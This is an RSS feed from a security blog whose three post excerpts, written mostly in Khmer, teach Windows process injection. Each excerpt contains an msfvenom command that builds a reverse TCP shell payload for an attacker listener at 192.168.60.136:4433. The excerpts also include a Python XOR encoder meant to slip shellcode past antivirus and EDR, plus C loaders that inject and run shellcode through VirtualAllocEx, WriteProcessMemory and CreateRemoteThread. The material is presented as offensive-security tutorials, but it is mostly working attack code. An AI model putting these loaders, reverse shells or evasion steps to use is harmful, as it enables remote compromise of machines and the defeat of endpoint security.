<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>Process Injection on ThikLab - CyberSec</title>
    <link>https://thiklab.com/en/categories/process-injection/</link>
    <description>Recent content in Process Injection on ThikLab - CyberSec</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <managingEditor>thiklife403@gmail.com (Thik)</managingEditor>
    <webMaster>thiklife403@gmail.com (Thik)</webMaster>
    <copyright><a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'><img alt='Creative Commons License' style='border-width:0;display:block;margin-left:auto;margin-right:auto;' src='https://i.creativecommons.org/l/by-sa/4.0/88x31.png' /></a>©2020 - 2023 All content is licensed under <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'>CC BY-SA</a>.</copyright>
    <lastBuildDate>Wed, 21 Jun 2023 21:01:06 +0700</lastBuildDate>
    
        <atom:link href="https://thiklab.com/en/categories/process-injection/index.xml" rel="self" type="application/rss+xml" />
    

      
      <item>
        <title>Process Injection - Bypass AV/EDR with XOR - 0x01</title>
        <link>https://thiklab.com/en/posts/process-injection-bypass-avedr-with-xor-0x01/</link>
        <pubDate>Wed, 21 Jun 2023 21:01:06 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Wed, 21 Jun 2023 21:01:06 +0700</atom:modified>
        <guid>https://thiklab.com/en/posts/process-injection-bypass-avedr-with-xor-0x01/</guid>
        <description>Summary នៅក្នុងអត្ថបទនេះយើងនឹងធ្វើការបង្កើត Shellcode តាមរយៈវិធីសាស្ត្រ Process Injection ដោយភ្ជាប់ជាមួយនិងការដាក់នូវកូនសោរ XOR ក្នុងការធ្វើកូដនីយកម្មដើម្បីបញ្ចៀសពីការរកឃើញរបស់កម្មវិធីកំចាត់មេរោគ ។
Shellcode ខាងក្រោមជាដំណើរការបង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅនៅលើម៉ាស៊ីន 64 bit ។
1  msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c   XOR Shellcode បន្ទាប់មកយើងនឹងធ្វើការ XOR ទៅលើកូដនោះដោយប្រើប្រាស់ Python Script ដូចខាងក្រោម៖
1 2 3 4 5 6 7 8 9 10  raw_shellcode = &amp;#34;my shellcode \xaa\xda\xca\[...]\xbe\x14\x49&amp;#34; enc_shellcode = [] print (&amp;#34;[+] Shellcode is encoding&amp;#34;) for opcode in raw_shellcode: enc_opcode = (ord(opcode) ^ 0x41) enc_shellcode.</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://thiklab.comimages/feature2/bam.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>c-shellcode</category>
            
          
            
              <category>bypass</category>
            
          
            
              <category>xor</category>
            
          
        
        
          
            
              <category>Process Injection</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>Process Injection without Write/Execute Permission</title>
        <link>https://thiklab.com/en/posts/process-injection-without-write-exec-permission/</link>
        <pubDate>Wed, 21 Jun 2023 21:01:06 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Wed, 21 Jun 2023 21:01:06 +0700</atom:modified>
        <guid>https://thiklab.com/en/posts/process-injection-without-write-exec-permission/</guid>
        <description>Pwn Self Injection បង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅលើម៉ាស៊ីន 64 bit ។
1  msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c   ខាងក្រោមជាវិធីសាស្ត្រសម្រាប់ចាក់ Process ចូលទៅកាន់ PID ណាមួយដោយមិនមាន DEP protection និងមិនមានសិទ្ធក្នុងការសរសេរចូល ឬដំណើរការបាន (Non-Writable / Non-Executable Allocation) ។
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;Windows.h&amp;gt; int main(int argc, char* argv[]) { unsigned char shellcode[] = &amp;#34;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50&amp;#34; &amp;#34;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&amp;#34; &amp;#34;\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&amp;#34; &amp;#34;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5&amp;#34;; HANDLE processHandle; HANDLE remoteThread; PVOID remoteBuffer; DWORD oldPerms; DWORD PID = 1524; printf(&amp;#34;Injecting to PID: %i&amp;#34;, PID); processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READ); WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL); VirtualProtectEx(processHandle, (LPVOID)sizeof(processHandle), sizeof(shellcode), PAGE_READONLY, &amp;amp;oldPerms); remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL); CloseHandle(processHandle); return 0; }   កែត្រង់ PID បន្ទាប់មក Compile កូដខាងលើតាមធម្មតា (សម្រាប់ Visual Studio 20xx តម្រូវឲ្យធ្វើការបិទ DEP Protection មុននិង Build) បន្ទាប់មកសូមសាកល្បងបើកដំណើរការ ។</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://thiklab.comimages/feature3/code-file.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>c-shellcode</category>
            
          
        
        
          
            
              <category>Process Injection</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>Process Injection - Self Injection Method</title>
        <link>https://thiklab.com/en/posts/process-injection-self-injection-method/</link>
        <pubDate>Tue, 20 Jun 2023 21:01:06 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Tue, 20 Jun 2023 21:01:06 +0700</atom:modified>
        <guid>https://thiklab.com/en/posts/process-injection-self-injection-method/</guid>
        <description>Self-Injection Payload ខាងក្រោមជាដំណើរការបង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅលើម៉ាស៊ីន 64 bit ។
1  msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c   បន្ទាប់មកយើងនឹង Compile Payload ធម្មតាដោយប្រើប្រាស់វិធីសាស្ត្រ Process Injection តាមបែប Slef-Injection ដោយផ្ដល់សិទ្ធតាមលំនាំដើម Read, Write និង Execute ។
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;Windows.h&amp;gt; int main() { unsigned char shellcode[] = &amp;#34;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50&amp;#34; &amp;#34;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&amp;#34; &amp;#34;\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&amp;#34; &amp;#34;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5&amp;#34;; void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, shellcode, sizeof shellcode); ((void(*)())exec)(); return 0; }   ដើម្បី Compile យើងអាចប្រើប្រាស់កម្មវិធីផ្សេងៗជាច្រើន តែសម្រាប់ខ្ញុំៗប្រើប្រាស់ Embarcadero Dev-C++ ដើម្បីដំណើរការបង្កើត ។</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://thiklab.comimages/feature3/terminal.gif" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>c-shellcode</category>
            
          
        
        
          
            
              <category>Process Injection</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      

    
  </channel>
</rss>
